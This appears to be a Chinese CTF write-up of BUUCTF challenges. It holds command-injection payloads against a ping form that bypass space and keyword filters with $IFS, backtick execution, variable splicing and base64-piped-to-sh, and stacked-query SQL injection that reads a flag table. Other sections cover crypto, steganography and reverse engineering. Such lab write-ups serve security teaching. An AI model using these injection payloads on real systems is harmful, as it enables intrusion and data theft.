# BUUCTF-内联执行-变量拼接-base绕过-sql改||类型-*.1

第五周 3.30

**目录**

[TOC]





## web

### [GXYCTF2019]Ping Ping Ping



<img src="https://i-blog.csdnimg.cn/blog_migrate/0252b548faf3b408a0274758c97e057a.png" alt="" style="max-height:209px; box-sizing:content-box;" />


ip 想到ping 在url上ping



<img src="https://i-blog.csdnimg.cn/blog_migrate/09f1fe3c84fa86792dbc84c781752aca.png" alt="" style="max-height:257px; box-sizing:content-box;" />


成功

```cobol
?ip=127.0.0.1;ls
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3077f89ad3407e70e1c41d72e64be245.png" alt="" style="max-height:320px; box-sizing:content-box;" />


发现flag文件 尝试访问



<img src="https://i-blog.csdnimg.cn/blog_migrate/e71c1ad17c71a8419bb8270f647f1cad.png" alt="" style="max-height:152px; box-sizing:content-box;" />


骂我们说明过滤了

我们先看看能不能访问index.php

发现也不行

开始尝试过滤

```swift
过滤空格
$IFS$9
${IFS}
$IFS$1
 
payload
127.0.0.1;cat$IFS$9index.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a509bb72e1fd561bd3e5b56dd5b0f8b9.png" alt="" style="max-height:524px; box-sizing:content-box;" />


成功 说明过滤了空格

```swift
/?ip=
 
PING 127.0.0.1 (127.0.0.1): 56 data bytes
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|
\{|\}/", $ip, $match);不能出现这些符号
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){ 不能出现//
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){ 不能出现/bush/
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){ 不能出现有关flag的字
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}
 
?>
```

我们开始构造

#### 1.内联执行

```bash
127.0.0.1;cat$IFS$9`ls`
 
``的作用就是将ls执行完返回 
 
相当于
127.0.0.1;cat$IFS$9flag.php,index.php
 
会返回命令执行完的
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/76f1234cec7cea34cf2392448cf93d57.png" alt="" style="max-height:641px; box-sizing:content-box;" />


执行成功源代码发现flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/adb525d9a01f527e881c27ad5cbcde8b.png" alt="" style="max-height:243px; box-sizing:content-box;" />


#### 2.变量拼接

因为过滤了flag 所以我们将变量赋值 然后进行拼接

payload

```swift
127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php
a= ag b = fa  变量赋值
$b$a   引用变量
相当于 flag
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7f15ae8922dd8b1bb3fe3b918b0c2a52.png" alt="" style="max-height:291px; box-sizing:content-box;" />


源代码中发现

#### 3.base绕过

```cobol
echo  输出命令
cat flag.php 进行base64  Y2F0IGZsYWcucGhw
base64 -d  解密base64执行 
sh 是shell命令语言解释器  通过这个执行base64 -d
 
 
所以payload
 
127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh
 
| 为管道符 直接执行命令   |左边命令的输出就会作为|右边命令的输入
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0458f945dfa3c1c811da0657d848a0ac.png" alt="" style="max-height:304px; box-sizing:content-box;" />


### [SUCTF 2019]EasySQL

打开环境



<img src="https://i-blog.csdnimg.cn/blog_migrate/996a7989610c95a1815dab5a5cd4c2e1.png" alt="" style="max-height:137px; box-sizing:content-box;" />


输入 1



<img src="https://i-blog.csdnimg.cn/blog_migrate/0e0de36be903a19369b5ec5006ce8e7c.png" alt="" style="max-height:148px; box-sizing:content-box;" />


输入0



<img src="https://i-blog.csdnimg.cn/blog_migrate/635fb57aeb581f4f16672262027c67f7.png" alt="" style="max-height:138px; box-sizing:content-box;" />


我们尝试万能密码

```csharp
1' or 1=1#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/899435ab486d41cb4bb5317297af84f1.png" alt="" style="max-height:125px; box-sizing:content-box;" />


不行 我们继续尝试随便注学会的堆叠注入

```sql
1;show databases;
注意这里是  database s 要加上s
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/68002a448f0d2cbea03d4857b4908103.png" alt="" style="max-height:153px; box-sizing:content-box;" />


爆出库 接着爆表

```sql
1;show tables;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/63246b3fc70a6929ec29fe7d54841b51.png" alt="" style="max-height:170px; box-sizing:content-box;" />


得到 我们尝试直接获取flag

```cobol
1;show columns from Flag;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f2c0304510f9fb35b6375f508e78134a.png" alt="" style="max-height:167px; box-sizing:content-box;" />


返回了nonono 说明过滤了 flag

我们开始猜测内置sql语句

```cobol
输入 1 得到数据
输入 0 nonono
 
a||b   MYSQL 中 || = 或
 
1||1  = 1   1||0  = 1   0||0 = 0
 
所以我们猜测 
select 输入 || 列 from 表
select 1 ||flag from Flag
 
这样 如果输入正确 就会输出 1 
如果错误 就会输出 0 即 nonono
 
```

#### 1*,1

我们猜到后台命令 我们可以尝试更改

```cobol
select 1 ||flag from Flag
select *,1 ||flag from Flag
 
这样 就会返回所有的数据
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dcbade45f6e555a52d49a8365955f962.png" alt="" style="max-height:181px; box-sizing:content-box;" />


#### 2.更改 || 类型

在mysql中  || 为 或

我们只要把 || 改为连接符就行了 他就会返回数值

```cobol
sql_mode=PIPES_AS_CONCAT来转换操作符的作用
```

```cobol
1;set sql_mode=PIPES_AS_CONCAT;select 1
 
 
select 1;set sql_mode=PIPES_AS_CONCAT;select 1 ||flag from Flag
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c1b684a0f44026b24467211050721654.png" alt="" style="max-height:170px; box-sizing:content-box;" />


得到flag

## Crypto

### 摩丝



<img src="https://i-blog.csdnimg.cn/blog_migrate/19b46bcb485b0531db68dcdef6e1e04b.png" alt="" style="max-height:467px; box-sizing:content-box;" />


### password

```cobol
姓名：张三 
生日：19900315
 
key格式为key{xxxxxxxxxx}
```

```cobol
flag{zs19900315}
```

## Misc

### N种方法解决

下载改后缀得到



<img src="https://i-blog.csdnimg.cn/blog_migrate/3b9aeee79cfe69b343743a5f1de36578.png" alt="" style="max-height:781px; box-sizing:content-box;" />


发现图片 和base64

搜索base64转图片解码得到二维码

<img src="https://i-blog.csdnimg.cn/blog_migrate/2a1a3200b90a14db0d6fef6049ac1cca.png" alt="" style="max-height:665px; box-sizing:content-box;" />


查看后得到key

### 乌镇峰会种图

下载后得到图片



<img src="https://i-blog.csdnimg.cn/blog_migrate/67706704feffd6829aa4b9d4554c8a82.png" alt="" style="max-height:140px; box-sizing:content-box;" />


确定只是图片

放入Stegsolve



<img src="https://i-blog.csdnimg.cn/blog_migrate/ecbf06f2fb95cb996b818c9f6d0378b3.png" alt="" style="max-height:424px; box-sizing:content-box;" />


得到flag

## Reverse

### 新年快乐

下载文件进行查壳



<img src="https://i-blog.csdnimg.cn/blog_migrate/6b34a51ebb6718fef2ec84ee1c908897.png" alt="" style="max-height:259px; box-sizing:content-box;" />


发现是upx  我们使用upx脱壳



<img src="https://i-blog.csdnimg.cn/blog_migrate/976343c6a26535c124938cb27001662a.png" alt="" style="max-height:519px; box-sizing:content-box;" />


放入ida32

反编译后得到代码

代码审计

```cobol
{
  int result; // eax
  char v4; // [esp+12h] [ebp-3Ah]
  __int16 v5; // [esp+20h] [ebp-2Ch]
  __int16 v6; // [esp+22h] [ebp-2Ah]
 
  __main();
  strcpy(&v4, "HappyNewYear!"); v4替换为"HappyNewYear!"
  v5 = 0;
  memset(&v6, 0, 0x1Eu);
  printf("please input the true flag:");
  scanf("%s", &v5);
  if ( !strncmp((const char *)&v5, &v4, strlen(&v4)) )
判断flag
strncmp 是进行字符串比较 如果两个字符串相同 就输出0   ！0=1 所以要相同
所以输入的是v4  就是HappyNewYear
    result = puts("this is true flag!");
  else
    result = puts("wrong!");
  return resul
```

所以flag就是

```undefined
flag{HappyNewYear!}
```

### xor

放入ida64 反编译

```cobol
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v3; // rsi
  int result; // eax
  signed int i; // [rsp+2Ch] [rbp-124h]
  char v6[264]; // [rsp+40h] [rbp-110h]
  __int64 v7; // [rsp+148h] [rbp-8h]
 
  memset(v6, 0, 0x100uLL);
  v3 = (char *)256;
  printf("Input your flag:\n", 0LL);
  get_line(v6, 256LL);
  if ( strlen(v6) != 33 )
    goto LABEL_12;
  for ( i = 1; i < 33; ++i )
    v6[i] ^= v6[i - 1];
  v3 = global;
  if ( !strncmp(v6, global, 0x21uLL) )
    printf("Success", v3);
  else
LABEL_12:
    printf("Failed", v3);
  result = __stack_chk_guard;
  if ( __stack_chk_guard == v7 )
    result = 0;
  return result;
}
```

我们查看成功语句 发现和v6有关 我们上去查看哪里有改v6的地方

```cobol
 for ( i = 1; i < 33; ++i )
    v6[i] ^= v6[i - 1];
```

找到了 然后我们去查找global

双击进去



<img src="https://i-blog.csdnimg.cn/blog_migrate/2e2aaf74c179e891669e98cc199fe25f.png" alt="" style="max-height:58px; box-sizing:content-box;" />


继续双击



<img src="https://i-blog.csdnimg.cn/blog_migrate/4a52e4ac816e43401473a6a28a550656.png" alt="" style="max-height:101px; box-sizing:content-box;" />


得到了判断的

我们进行exp

```cobol
s =['f',0xA,'k',0xC,'w','&','O','.','@',0x11,'x',0xD,'Z',';','U',0x11,'p',0x19,'F',0x1F,'v','"','M','#','D',0xE,'g',6,'h',0xF,'G','2','O']
flag='f'  #第一个不进行异或
for i in range(1,len(s)):
    if(isinstance(s[i],int)):              #判断s里的是不是int类型
        s[i]=chr(s[i])        #把int类型边为chr
for i in range(1,len(s)):
    flag+=chr(ord(s[i])^ord(s[i-1])) #根据题目进行异或运算
print(flag)
```

得到flag

```undefined
flag{QianQiuWanDai_YiTongJiangHu}
```